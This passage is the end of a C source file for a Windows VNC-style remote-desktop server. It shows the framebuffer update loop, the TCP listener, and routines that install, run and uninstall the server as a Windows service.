         * and if we only read one event per iteration the pointer/key
         * queue at the client piles up and feels unresponsive. */
        while (sock_has_data(s)) {
            if (read_one_message(s, scr, &st) < 0) goto session_end;
        }

        DWORD now = GetTickCount();
        DWORD since = now - last_send_tick;
        if (st.need_update && (since >= min_interval_ms || st.force_full)) {
            int force = st.force_full;
            st.force_full = 0;
            st.need_update = 0;
            last_send_tick = now;
            if (send_fb_update(s, scr, force) < 0) goto session_end;
        } else if (st.need_update && since >= starve_ms) {
            /* Keep-alive: if nothing's been dirty for a while, still respond
             * so the client doesn't think we died. */
            last_send_tick = now;
            st.need_update = 0;
            uint8_t hdr[4]; hdr[0]=0; hdr[1]=0; pack_u16(hdr+2, 0);
            if (write_exact(s, hdr, 4) < 0) goto session_end;
        }

        /* Wait a short bit for more input or a dirty probe tick. */
        fd_set rd; FD_ZERO(&rd); FD_SET(s, &rd);
        struct timeval tv = {0, 16 * 1000}; /* 16 ms → dirty probe @ ~60 Hz */
        select(0, &rd, NULL, NULL, &tv);
    }

session_end:
    vlog("=== session end: ptr=%u key=%u fbreq=%u setenc=%u setfmt=%u cut=%u ===",
         st.cnt_ptr, st.cnt_key, st.cnt_fbreq, st.cnt_setenc, st.cnt_setfmt, st.cnt_cut);
    return 0;
}

/* ──────────────────────── listener loop ───────────────────────────── */
static void server_run(void) {
    log_init();
    vlog("=== server starting (pid=%lu sess=%lu) ===",
         (unsigned long)GetCurrentProcessId(), (unsigned long)0);

    WSADATA w; WSAStartup(MAKEWORD(2,2), &w);
    Screen scr = {0};
    if (screen_init(&scr) < 0) { vlog("screen_init failed"); return; }
    vlog("screen %dx%d (%dx%d tiles)", scr.width, scr.height, scr.tiles_x, scr.tiles_y);

    int port = cfg_port();
    char password[9]; cfg_password(password);
    vlog("listening port=%d", port);

    SOCKET srv = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    int on = 1; setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, (char*)&on, sizeof(on));
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t)port);
    addr.sin_addr.s_addr = INADDR_ANY;
    if (bind(srv, (struct sockaddr*)&addr, sizeof(addr)) < 0) { vlog("bind failed"); return; }
    if (listen(srv, 4) < 0) return;

    while (!g_stop_requested) {
        fd_set rd; FD_ZERO(&rd); FD_SET(srv, &rd);
        struct timeval tv = {1, 0};
        if (select(0, &rd, NULL, NULL, &tv) <= 0) continue;

        struct sockaddr_in peer; int plen = sizeof(peer);
        SOCKET c = accept(srv, (struct sockaddr*)&peer, &plen);
        if (c == INVALID_SOCKET) continue;
        vlog("accept %s:%d",
             inet_ntoa(peer.sin_addr), (int)ntohs(peer.sin_port));
        rfb_session(c, &scr, password);
        closesocket(c);
    }

    screen_free(&scr);
    closesocket(srv);
    WSACleanup();
}

/* ──────────────────────── service plumbing ────────────────────────── */
static void WINAPI svc_ctrl_handler(DWORD op) {
    if (op == SERVICE_CONTROL_STOP || op == SERVICE_CONTROL_SHUTDOWN) {
        InterlockedExchange(&g_stop_requested, 1);
        g_svc_status.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(g_svc_handle, &g_svc_status);
    }
}
static void WINAPI svc_main(DWORD argc, LPSTR *argv) {
    (void)argc; (void)argv;
    g_svc_handle = RegisterServiceCtrlHandlerA(SERVICE_NAME, svc_ctrl_handler);
    g_svc_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_svc_status.dwCurrentState = SERVICE_RUNNING;
    g_svc_status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    SetServiceStatus(g_svc_handle, &g_svc_status);
    server_run();
    g_svc_status.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_svc_handle, &g_svc_status);
}
static int do_install(void) {
    char exe[MAX_PATH]; GetModuleFileNameA(NULL, exe, sizeof(exe));
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "\"%s\" -service", exe);
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) return 1;
    SC_HANDLE svc = CreateServiceA(scm, SERVICE_NAME, SERVICE_DISPLAY,
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL, cmd, NULL, NULL, NULL, NULL, NULL);
    if (!svc && GetLastError() == ERROR_SERVICE_EXISTS) {
        svc = OpenServiceA(scm, SERVICE_NAME, DELETE);
        if (svc) { DeleteService(svc); CloseServiceHandle(svc); }
        svc = CreateServiceA(scm, SERVICE_NAME, SERVICE_DISPLAY,
            SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL, cmd, NULL, NULL, NULL, NULL, NULL);
    }
    if (!svc) { CloseServiceHandle(scm); return 1; }
    SERVICE_DESCRIPTIONA desc = { SERVICE_DESC };
    ChangeServiceConfig2A(svc, SERVICE_CONFIG_DESCRIPTION, &desc);
    StartServiceA(svc, 0, NULL);
    CloseServiceHandle(svc); CloseServiceHandle(scm);
    return 0;
}
static int do_uninstall(void) {
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) return 1;
    SC_HANDLE svc = OpenServiceA(scm, SERVICE_NAME, SERVICE_STOP | DELETE);
    if (svc) {
        SERVICE_STATUS st;
        ControlService(svc, SERVICE_CONTROL_STOP, &st);
        DeleteService(svc);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    return 0;
}

int main(int argc, char **argv) {
    if (argc >= 2 && strcmp(argv[1], "-install")   == 0) return do_install();
    if (argc >= 2 && strcmp(argv[1], "-uninstall") == 0) return do_uninstall();
    if (argc >= 2 && strcmp(argv[1], "-console")   == 0) {
        printf("%s listening, Ctrl+C to stop\n", SERVER_BANNER);
        server_run();
        return 0;
    }
    if (argc >= 2 && strcmp(argv[1], "-service")   == 0) {
        SERVICE_TABLE_ENTRYA st[] = { { SERVICE_NAME, svc_main }, { NULL, NULL } };
        StartServiceCtrlDispatcherA(st);
        return 0;
    }
    printf("usage: %s -install | -uninstall | -service | -console\n", argv[0]);
    return 0;
}
